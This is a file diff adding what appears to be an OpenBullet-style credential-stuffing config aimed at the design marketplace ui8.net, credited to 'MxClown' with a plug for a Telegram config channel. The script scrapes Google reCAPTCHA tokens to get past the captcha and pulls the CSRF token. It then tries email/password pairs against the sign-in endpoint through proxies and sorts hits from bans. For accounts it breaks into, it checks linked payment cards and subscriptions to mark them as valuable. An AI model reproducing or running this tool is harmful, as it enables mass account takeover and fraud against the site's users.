@@ -1,0 +1,159 @@
+[SETTINGS]
+{
+  "Name": "ui8.net [@MxClown]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-12T16:57:06.5779914+05:30",
+  "AdditionalInfo": "Join @ClownConfigs For More.",
+  "Author": "MxClown",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join @ClownConfigs For More.",
+      "VariableName": "Join",
+      "Id": 690591423
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdYW5UUAAAAAG8PWYEdNFD1Gqt2pRFSFObQB085&co=aHR0cHM6Ly91aTgubmV0OjQ0Mw..&hl=en&v=BycHQdSIhzR_1EcOLw2mOzYQ&size=invisible&cb=yn3zg54s8j2s" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "Token" 
+
+REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LdYW5UUAAAAAG8PWYEdNFD1Gqt2pRFSFObQB085" 
+  CONTENT "v=Q_rrUPkK1sXoHi4wbuDTgcQR&reason=q&c=<Token>&k=6LdYW5UUAAAAAG8PWYEdNFD1Gqt2pRFSFObQB085&co=aHR0cHM6Ly93d3cuY3VsdC5maXQ6NDQz&hl=en&size=invisible&chr=%5B59%2C98%2C9%5D%22&vh=7694049172&bg=!FhCgEF3IAAaFQKcohUBHF94Jc7i5Jv4-ACkAIwj8Rt5qiKbaC6pTK5z-a_M7jqrCDYmRQkFu-FXDl0OtZGpLWY__rQcAAAFbVwAAAAZtAQecC6LHebCMZqXeqohkPiDjDHwTnk_JsfA9Xhy4MnVSdngoGhVeqkWHd0jbqnVB_MRhXjHP59By0kfGsrT7wWzAWuUQ7mcOUkDwzftZ18tuFaGXihYiAwkF4EdYchDqNlcyGUKZc8p9Az9O2pWKfZjYLDE3UDC5TLefFZG9SH-v7oshe7gRKbsTF2QgSX3Vh5v4FTL-MW7s6WmbY8V38GN4jinRllSmJGZI1uFpegOmaZHT5fcMtN6eBafw30O9TXeqto4BpeZ6qE1z2tUoUvGXrPo3dXepiSk8r_Fx4cBTFS2A_VjqL-Erab6mLeSCn5vl1VCzQNIrJCphlatBt1hVJT2bd0PMRlaT1G80m5ZMWh-5dXpoD3QBbAlYkuazDMuP8h69HcAeOMKcDueqzcw6BFqcwlmOaY1t0HJQwSB7IkcGGaXsI0TAGO_BFHQ6mzIBWvSbWgIoxvQ4Gi-js9HTywxjZlnwUkAvXGMAuZDwoqoG_b4zv4PpypFH-tDneMb87-alYLpOzSNZkbDpeFPvk6CI1gVOO1tRLseNV3kO52Sty26ANq6ySxxMjiw11UOJl1OW0BYp7cxBQWs8x2QzZSKQ5rpR-t4-tMdJa1OF94zmKFMU3yy41bzZ7uPexq3ErubP3biZbdFs5MiI3315GA0qysT0NVVkS33D0WoquaaT_3DowirJgDd116FFcI9LQIgReNEYYtwh9GiXyB4qTvDZ-brns5TnWO3K_bSHhuOgaT-KLNXKQ-EJgmsCbuKCv0Mh7bbYW0SACIMf3LSDSd1-DzCdhKRZnPTywKUp9m58IODcdeWd1di3T_CmfcGYFGE3ct5dLY_lT2_n0YNYf7bOQl0pxLwjFnJD0kR742yH3wyABkkDGgWCws-zQoUv9aa3DJCz4zZqW0YM75K-q7m4rz20iVae7BwHhXece2ZVfkWJ4C-HVBlBK8T8zfFUtCR5v2o4sAwBI0nXbFF27Edy63Z6tZn5Jpv-DAu70B7Zrx_xuoIJsYmMh8hai0QF6k8wDk5x7xjbRU_H-3YZtx7E1QGHJ_ngtKCgskma4eq1AEJp5ObpJpMylN8-gzWw5X3f0VQeKW21guIudaBtHW20voQiltOWmXbSA9H5M_6pToHiI5Fn9WKjVsbo1DVAAlYPNMrWfb4xFv0CSKCt7maE63YAlM1kgKWdfp7iCiaupChzZsctjF7TJjnhZk9sTfxvMlA_zhmAWzWp5iuly-L3H1eihJm7qyv83fTrIqucElXqXxnHLX1y1NdAUUhz3fSknWpnIE8mdhKsy7yJp7Ms-u4hqK3JL4QeMCtgFqUDlz3gwv5cEpIpEaDS48J2aMfTyZYEhLuCGSIsXGP3w2aaLv1sWNlERflaSanCvqsREKawOs5mBPH9uE3aeY8JHZH9hf1H-BQzbRR1p6mgD8teOx09WkUOrTBLFI9gfA24Ui_0FeFrCafNjYWE0Yxk30Dl6ejjqbZwmZh6ynLZyXa6XeQRNrYndb-EzgihKUzAFS3lfcOFCndOlFBABrV8rjGgGSCcsRmZPi0NQhTXJk4bVL0PQbu_T8A3XJBiBA_eFHO6-TgCijjcnXlMPkJANThYzo61YYNMYE16NBZLVozFwgnfOTj5P4rz33G8Y0NLbh6ksjh9RSkTDKZ2y2oMv1A40YE0i18apnt86n0iE3PIPWXNZ65X7d_Ab7kwlGh5OJQLerafGcXjbffpjNDWGhcZd2z0F2ayFyM5EjIiDNdbMaeiXnb0rEnnIbuTImkplfwyHrYjK57PkhGC9U9HwZaWYMkX-ZAAEW9F7Kbcmy0CtcfBm_c1ZvPJzlmJUHKpBoxKQ2gXYcYp3hStVqnANJwhpadtjZec1ETTGVSgsgEZe6LZ6Sbs-bdIS7iunFz-PlHzL7kM-yeHMFgzRXII-0XCEueimooJvgqJGHMhIvWEu05HFQP4X1-QKB1g-r44duZ2emad5CYpAlDYxS8GrJ9hItXHhBsM7YOPwhGZjmknVE18CNkwUPO_yM_OVy7XdrR899RfXFtio51G0IXb73_xZWBii3iVE3YD2AYUe6e34tYxdfawi0xZzEcq78NLVwxLV8uja23xVk9q6hrCRRUM2mVsW47wCOs7vKJkbONmkNyuTgHHvrSI9Wuz9UckaLajMEhCVDcZDN8MOp-JBe-wgvnWeHVG3vY6HM1XBTVhy_H-T5atM-TI4rP8PECS1e8bB1pOSXOYNMesu37W2wBPLGCsDkqQZzXj72IOUtzA0BjeQIpHOTOV3MqfMYkiY-CiHLQxJaOQbZm2vgeHj9pCp0OJz9FmEv6k4mi9FGRn1xmWfueENuDgqgim6_CVdKD4wG78L85YFzxaTzTdXo55IfYn6nOscqB-9XkMWn-eHLh9tjZrwYJtkPTHxQA_EuaCw4td6WqGSSYUWdl35NuGQoZYtO7YNg6YsMqNWuRBcIE9KiN5LjBNjAs30bLq8CORFx3YXMKrLGrKCcbdyTyDd-zRxbkPZSZSFG3UE-6V_fPqsu9LUUf7pbFxffLia4GbhorWRXoT65RZez6k4E4FmTXzStnWpQ0AFsyeGpoSONyUcjumgWhbqMUpThInItkM3oZRLc7iZNTlGiWx10ouSJi2p9k0v3HnnaODkBxKrlo5iQ64SuWJuDzIO9msNHTCdHD1rjA7ATmkKrwcWRgG2RpqWX4JjtYAD9trrOg_i29viDasKMFz-YXlrjXSLYFG-CjhAqGGAwTPNvLKYwyxzMlydYGtPe1wEphuEU3hK-NZPhV5fhMhBimyc8WlJcRIq4ZdHWRZsLeoOEjF7RMcRao8ZzjNYoXz9_FRaR_pKLh5nn455opCIAEmGdWjaFNhdxXXHFPKlQxS1FPZYYcl_Q9B3jF8YQe1lrkYYkWtmpKWMyJmfkdfX7QFq9WvRD01DnosKCaLUJM3HH2nKQvlnTVTNXXbOjyCscyBUOxG0HSePFg8Y27gSndXHy4GB6aEJq0J9XTK1ETqW63LUgYjG2EWFFUGMgidZHAf0j_g0LZfBkT276NMi-sg_hsb4GMXr807UFLHCZIv7t55ZvlG0edOWyqQ6d1_vOSBEmnq3adMJDO2Uunq92uF_SpBR5Ejga_9gLboIiIA2IeqbmjrHlaYMRM4laAm-h09YaAwb6-XmD18Qu8nK1SenQGhlK2PZJDIOCOcAzoO8v16bAsckovrR6qmzHJ4GPr_Vz1_OaLZvh_Rsa1JiV-ppFYSaEaNeaFJBFmys8sK_HlFsco1M61HcX27N3zGdnby-ru5vu9uCYpAF5wmMLW_6eN49KroMRmTN9hrqW5fWJsBYHxMEjjGmFzJLKWjHA3jhNXv28l2ovMMF0N1moE2KE9EgBsPU1Rg-QiLPJKcIW2SGLVnWC4YlZhrnYIQfto6eCxEhjf2QAd5jTqSmYs9YP1tfG1OMKgc02wja9RUGa8ggfsBKbOx7sOWRTJW9L_Xd5JwVD0tr4ztjpsJi9MdVfMP1XZ_blaMLDuVLoDurT9ZtCBW6qfiP9UuUhqWyEvI3Ve6y5kQmKlmB0BwgwmGrcP4V7e3SfM_XaFTf8mKNC0sqwmMwTgER60naMp-BMJXoyDZK1d2IymC7m9T2mVDcdBGUH98878uoT8yc9FTyRwqbgPxj7CL8p08TrIic7guL2mBFzH3D_qjHwnyIp24vID04PSPht4WnOx1tYI8tqbkG-4lflozShtRZUYgccVOg8EAn2IO_oAHs6ZvNZQ-FMJBvFnLfXfi3ZlhA7SEY4OiigHIvqbx8-OMLDrsx_Uj4sZSrKEb8pBJu-7bngpBZDVeK51QdG_ZrxIsD0Qv9yPaXLMnxtic86KNH7ig4nFTu5ohmGLzaWu8f9vRDRh43Z0z-BOnamEPC_hSGPStvd9Z0JsK1fsFUa6ouodVEjFIWMGfbkXO14FjlI374g7a5CZUH7-P44oIvQmxFd8c3AI4syUrTg*" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "rresp" 
+
+REQUEST GET "https://ui8.net/account/signin?json=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "=\"csrf-token\" value=\"" "\"" -> VAR "CSRF" 
+
+REQUEST POST "https://ui8.net/account/signin" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"next\":\"/\",\"rcToken\":\"<rresp>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: ui8.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "X-CSRF-TOKEN: <CSRF>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://ui8.net" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ui8.net/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Found. Redirecting to /" 
+  KEYCHAIN Failure OR 
+    KEY "Found. Redirecting to /account/signin" 
+  KEYCHAIN Ban OR 
+    KEY "You have made too many login attempts." 
+
+REQUEST GET "https://ui8.net/api/account/cards" 
+  
+  HEADER "Host: ui8.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-CSRF-TOKEN: <CSRF>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ui8.net/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+FUNCTION CountOccurrences "\"last4\"" "<SOURCE>" -> CAP "Linked Card" 
+
+REQUEST GET "https://ui8.net/api/purchases" 
+  
+  HEADER "Host: ui8.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-CSRF-TOKEN: <CSRF>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ui8.net/account/purchases?status=0" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR ",\"subscriptions\":" "," CreateEmpty=FALSE -> CAP "Subscription" 
+
+FUNCTION Constant "@MxClown | Join @ClownConfigs For More." -> CAP "Credits" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Linked Cards>" GreaterThan "0" 
+    KEY "<Subscription>" Contains "true" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Linked Cards>" LessThan "1" 
+    KEY "<Subscription>" Contains "false" 
+
